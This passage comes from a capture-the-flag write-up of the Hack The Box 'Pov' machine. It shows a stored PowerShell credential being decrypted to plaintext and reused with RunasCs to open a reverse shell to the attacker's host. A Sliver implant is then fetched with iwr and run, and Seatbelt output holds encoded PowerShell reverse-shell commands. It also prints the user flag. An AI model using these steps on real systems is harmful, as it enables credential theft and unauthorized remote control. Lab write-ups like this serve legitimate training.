BUILTIN\Users                          Alias            S-1-5-32-545                                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                  Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                       Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\dev                        Well-known group S-1-5-82-781516728-2844361489-696272565-2378874797-2530480757 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                     


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

As next step we enumerated the `local available users` and their `home folders`.

```c
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/26/2023   4:31 PM                .NET v4.5                                                             
d-----       10/26/2023   4:31 PM                .NET v4.5 Classic                                                     
d-----       10/26/2023   4:21 PM                Administrator                                                         
d-----       10/26/2023   4:57 PM                alaading                                                              
d-r---       10/26/2023   2:02 PM                Public                                                                
d-----       12/25/2023   2:24 PM                sfitz
```

```c
PS C:\Users\sfitz\Documents> dir


    Directory: C:\Users\sfitz\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       12/25/2023   2:26 PM           1838 connection.xml
```

We `decrypted` the file like the following.

```c
PS C:\Users\sfitz\Documents> type connextion.xml
PS C:\Users\sfitz\Documents> strings connection.xml
PS C:\Users\sfitz\Documents> [xml]$xmlContent = Get-Content -Path "C:\users\sfitz\Documents\connection.xml"
PS C:\Users\sfitz\Documents> $encryptedPassword = $xmlContent.Objs.Obj.Props.SS.'#text'
PS C:\Users\sfitz\Documents> $securePassword = $encryptedPassword | ConvertTo-SecureString
PS C:\Users\sfitz\Documents> $username = $xmlContent.Objs.Obj.Props.S.'#text'
PS C:\Users\sfitz\Documents> $credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
PS C:\Users\sfitz\Documents> $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password)
PS C:\Users\sfitz\Documents> $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
PS C:\Users\sfitz\Documents> Write-Output $plainPassword
f8<--- SNIP --->m3
```

Shoutout to `tommyshark`: or just use this one line:

```
PS C:\Users\sfitz\Documents> $cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *
```

| Password |
| ---- |
| f8<--- SNIP --->m3 |

## Privilege Escalation to alaading

We `reused` the `password` together with `RunasCs` to get a shell as `alaading`.

- [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)

```c
┌──(kali㉿kali)-[/media/…/CTF/HTB/pov/serve]
└─$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
--2024-01-28 11:47:03--  https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240128%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240128T114903Z&X-Amz-Expires=300&X-Amz-Signature=fed448e27ed19733b0f7ac31c2695b7cfc10c32aef82280c327a844b2cb5af9d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=201331135&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream [following]
--2024-01-28 11:47:03--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240128%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240128T114903Z&X-Amz-Expires=300&X-Amz-Signature=fed448e27ed19733b0f7ac31c2695b7cfc10c32aef82280c327a844b2cb5af9d&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=201331135&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39889 (39K) [application/octet-stream]
Saving to: ‘RunasCs.zip’

RunasCs.zip                                                100%[========================================================================================================================================>]  38.95K  --.-KB/s    in 0.07s   

2024-01-28 11:47:04 (585 KB/s) - ‘RunasCs.zip’ saved [39889/39889]
```

```c
┌──(kali㉿kali)-[/media/…/CTF/HTB/pov/serve]
└─$ unzip RunasCs.zip 
Archive:  RunasCs.zip
  inflating: RunasCs.exe             
  inflating: RunasCs_net2.exe
```

```c
┌──(kali㉿kali)-[/media/…/CTF/HTB/pov/serve]
└─$ mv RunasCs.exe a.exe
```

```c
┌──(kali㉿kali)-[/media/…/CTF/HTB/pov/serve]
└─$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```c
PS C:\> mkdir temp


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/28/2024   3:50 AM                temp
```

```c
PS C:\temp> iwr http://10.10.16.39/a.exe -o a.exe
```

```c
PS C:\temp> .\a.exe "alaading" 'f8<--- SNIP --->m3' cmd.exe -r 10.10.16.39:6969

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5bb3c$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 2176 created in background.
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.39] from (UNKNOWN) [10.10.11.251] 49826
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
pov\alaading
```

## user.txt

```c
C:\Users\alaading\Desktop>type user.txt
type user.txt
f9d0795bda725a4df9ee1622d564f191
```

## Persistence

I spun up `Sliver` to gain persistence and access to more tooling.

```c
┌──(kali㉿kali)-[~]
└─$ sliver-server
[*] Loaded 20 aliases from disk
[*] Loaded 104 extension(s) from disk

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain improvise
[*] Server v1.5.41 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver >
```

```c
[server] sliver > generate --mtls 10.10.16.39 --os windows --arch amd64 --format exe --disable-sgn --save foobar.exe

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 29s
[*] Implant saved to /home/kali/foobar.exe
```

```c
[server] sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1
```

```c
C:\temp>powershell.exe
powershell.exe
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\temp>
```

```c
PS C:\temp> iwr http://10.10.16.39/foobar.exe -o foobar.exe
iwr http://10.10.16.39/foobar.exe -o foobar.exe
```

```c
PS C:\temp> .\foobar.exe
.\foobar.exe
```

```c
[*] Session 09270ceb SELECTED_BRICKLAYING - 10.10.11.251:49828 (pov) - windows/amd64 - Sun, 28 Jan 2024 11:54:20 UTC
```

```c
[server] sliver > use 09270ceb-b7b2-48bb-ac71-0a7aef938817

[*] Active session SELECTED_BRICKLAYING (09270ceb-b7b2-48bb-ac71-0a7aef938817)

[server] sliver (SELECTED_BRICKLAYING) >
```

## Pivoting

We investigated the newly gained privileges by running several tools like `Seatbelt` and `WinPEAS`.

### Seatbelt

- [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
- [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

```c
[server] sliver (SELECTED_BRICKLAYING) > execute-assembly Seatbelt.exe -group=system

[*] Output:


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 


====== AMSIProviders ======

====== AntiVirus ======

Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
====== AppLocker ======

  [*] AppIDSvc service is Stopped

    [*] Applocker is not running because the AppIDSvc is not running

  [*] AppLocker not configured
====== ARPTable ======

  Loopback Pseudo-Interface 1 --- Index 1
    Interface Description : Software Loopback Interface 1
    Interface IPs      : ::1, 127.0.0.1
    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

    Internet Address      Physical Address      Type
    224.0.0.22            00-00-00-00-00-00     Static


  Ethernet0 2 --- Index 4
    Interface Description : vmxnet3 Ethernet Adapter
    Interface IPs      : dead:beef::225, dead:beef::1fa5:c223:f3bb:1f2, fe80::3569:3e37:273e:6ef2%4, 10.10.11.251
    DNS Servers        : 127.0.0.1

    Internet Address      Physical Address      Type
    10.10.10.2            00-50-56-B9-A0-EE     Dynamic
    10.10.11.255          FF-FF-FF-FF-FF-FF     Static
    224.0.0.22            01-00-5E-00-00-16     Static
    224.0.0.251           01-00-5E-00-00-FB     Static
    224.0.0.252           01-00-5E-00-00-FC     Static


====== AuditPolicies ======

====== AuditPolicyRegistry ======

====== AutoRuns ======


  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
    C:\Windows\system32\SecurityHealthSystray.exe
    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
====== Certificates ======

====== CertificateThumbprints ======

CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 4:59:59 PM
LocalMachine\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 3:13:04 PM
LocalMachine\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 3:04:01 PM
LocalMachine\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 1:00:12 PM
LocalMachine\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 12:50:46 PM
LocalMachine\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
====== CredGuard ======

====== DNSCache ======

  Entry                          : 1.0.0.127.in-addr.arpa
  Name                           : 1.0.0.127.in-addr.arpa.
  Data                           : pov.htb

  Entry                          : pov.htb
  Name                           : 
  Data                           : 

  Entry                          : pov.htb
  Name                           : pov.htb
  Data                           : 127.0.0.1

  Entry                          : dev.pov.htb
  Name                           : dev.pov.htb
  Data                           : pov.htb

====== DotNet ======

  Installed CLR Versions
      4.0.30319

  Installed .NET Versions
      4.7.03190

  Anti-Malware Scan Interface (AMSI)
      OS supports AMSI           : True
     .NET version support AMSI   : False
====== EnvironmentPath ======

  Name                           : C:\Windows\system32
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\Wbem
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\OpenSSH\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Users\alaading\AppData\Local\Microsoft\WindowsApps
  SDDL                           : O:S-1-5-21-2506154456-4081221362-271687478-1001D:(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIID;FA;;;S-1-5-21-2506154456-4081221362-271687478-1001)

====== EnvironmentVariables ======

  <SYSTEM>                           ComSpec                            %SystemRoot%\system32\cmd.exe
  <SYSTEM>                           DriverData                         C:\Windows\System32\Drivers\DriverData
  <SYSTEM>                           OS                                 Windows_NT
  <SYSTEM>                           Path                               %SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;%SYSTEMROOT%\System32\OpenSSH\
  <SYSTEM>                           PATHEXT                            .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
  <SYSTEM>                           PROCESSOR_ARCHITECTURE             AMD64
  <SYSTEM>                           PSModulePath                       %ProgramFiles%\WindowsPowerShell\Modules;%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules
  <SYSTEM>                           TEMP                               %SystemRoot%\TEMP
  <SYSTEM>                           TMP                                %SystemRoot%\TEMP
  <SYSTEM>                           USERNAME                           SYSTEM
  <SYSTEM>                           windir                             %SystemRoot%
  <SYSTEM>                           NUMBER_OF_PROCESSORS               2
  <SYSTEM>                           PROCESSOR_LEVEL                    6
  <SYSTEM>                           PROCESSOR_IDENTIFIER               Intel64 Family 6 Model 85 Stepping 7, GenuineIntel
  <SYSTEM>                           PROCESSOR_REVISION                 5507
  NT AUTHORITY\SYSTEM                Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  NT AUTHORITY\SYSTEM                TEMP                               %USERPROFILE%\AppData\Local\Temp
  NT AUTHORITY\SYSTEM                TMP                                %USERPROFILE%\AppData\Local\Temp
  POV\alaading                       Path                               %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;
  POV\alaading                       TEMP                               %USERPROFILE%\AppData\Local\Temp
  POV\alaading                       TMP                                %USERPROFILE%\AppData\Local\Temp
====== Hotfixes ======

Enumerating Windows Hotfixes. For *all* Microsoft updates, use the 'MicrosoftUpdates' command.

====== InterestingProcesses ======

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 4200
    Owner        : 
    CommandLine  : "C:\Windows\System32\cmd.exe" /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

    Category     : interesting
    Name         : powershell.exe
    Product      : PowerShell host process
    ProcessID    : 4256
    Owner        : 
    CommandLine  : powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAwACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

    Category     : interesting
    Name         : cmd.exe
    Product      : Command Prompt
    ProcessID    : 4652
    Owner        : 
